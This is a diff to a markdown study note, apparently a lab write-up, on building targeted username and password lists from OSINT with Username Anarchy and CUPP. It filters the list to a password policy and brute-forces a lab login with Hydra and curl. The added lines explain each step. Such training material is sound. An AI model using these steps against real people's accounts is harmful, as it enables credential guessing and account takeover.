@@ -4,11 +4,11 @@
 
 ## Why Custom Wordlists?
 
-Generic lists like rockyou cast a wide net but are inefficient for specific targets. Custom wordlists built from OSINT on the target dramatically narrow the search space and increase hit rate.
+Generic lists like rockyou.txt are wide but inefficient for a specific person. Custom wordlists built from OSINT (Open Source Intelligence — publicly available information) on the target narrow the search dramatically and increase the hit rate.
 
 **Two tools for this:**
 - **Username Anarchy** — generates username variations from a real name
-- **CUPP** — generates personalized password lists from OSINT profile data
+- **CUPP** (Common User Passwords Profiler) — generates personalized password lists from OSINT profile data
 
 ---
 
@@ -21,11 +21,13 @@ Generates every common username format from a first/last name.
 git clone https://github.com/urbanadventurer/username-anarchy.git
 cd username-anarchy
 ```
+> Clones the Username Anarchy repository. Run this once to install it; the tool requires no compilation.
 
 ### Generate usernames
 ```bash
 ./username-anarchy Jane Smith > jane_smith_usernames.txt
 ```
+> Generates all common username formats for the given first and last name and saves them to a file. Replace `Jane Smith` with your target's real name.
 
 **What it produces** (14 variations for Jane Smith):
 ```
@@ -33,7 +35,7 @@ jane, janesmith, jane.smith, j.smith, janes, smithjane, smith,
 smithj, smith.j, smith.jane, JSmith, jane1, js, Jane.Smith ...
 ```
 
-**When to use:** Any time you know the target's real name and need to enumerate possible login usernames — corporate portals, AD accounts, web apps.
+**When to use:** Any time you know the target's real name and need to guess their login username — corporate portals, Active Directory (AD) accounts, web apps.
 
 ---
 
@@ -46,13 +48,15 @@ Builds a personalized password list from OSINT about the target.
 git clone https://github.com/Mebus/cupp.git
 # or: sudo apt install cupp -y
 ```
+> Installs CUPP (Common User Passwords Profiler) via git or apt. Either method works; the apt version may lag behind the latest release.
 
 ### Run interactively
 ```bash
 python3 cupp/cupp.py -i
 ```
+> Starts CUPP in interactive mode. It prompts for profile details (name, birthdate, pet, company, etc.) and generates a personalized password list. The output file is named after the target's first name.
 
-Feed it everything you found during recon — the more detail, the better the list.
+Give CUPP everything you found during recon. The more detail you provide, the better the resulting password list.
 
 **Example profile (Jane Smith):**
 | Field | Value |
@@ -92,6 +96,7 @@ grep -E '^.{6,}$' jane.txt \
   | grep -E '([!@#$%^&*].*){2,}' \
   > jane-filtered.txt
 ```
+> Filters the CUPP output to only passwords that match the target's policy. Each `grep` stage removes candidates that fail one rule. Adjust the regex filters to match whatever policy you have (change the special char set, min length, or add/remove filters).
 
 | Filter | Regex | Purpose |
 |--------|-------|---------|
@@ -109,7 +114,7 @@ grep -E '^.{6,}$' jane.txt \
 
 **Objective:** Build targeted username and password lists from OSINT on "Jane Smith," filter to policy, brute-force the login form.
 
-**Why custom lists work here:** Generic lists won't contain `3n4J!!` — a CUPP-generated leet+special-char mutation of Jane's name. Only a targeted list finds it.
+**Why custom lists work here:** Generic lists won't have `3n4J!!` in them. That is a leet-speak plus special-character mutation of Jane's name that CUPP generates. Only a targeted list finds it.
 
 ---
 
@@ -137,6 +142,7 @@ curl -s -X POST http://TARGET_IP:TARGET_PORT/ \
   -d "username=jane&password=3n4J!!" -c /tmp/cookies.txt
 curl -s -b /tmp/cookies.txt http://TARGET_IP:TARGET_PORT/success
 ```
+> Full five-step chain: generate username variations, build a personalized password list non-interactively via `printf`, filter to policy, brute-force the login form with Hydra, then retrieve the flag with curl. Replace names, IP, port, and credentials throughout.
 
 **Credentials found:** `jane : 3n4J!!`
 
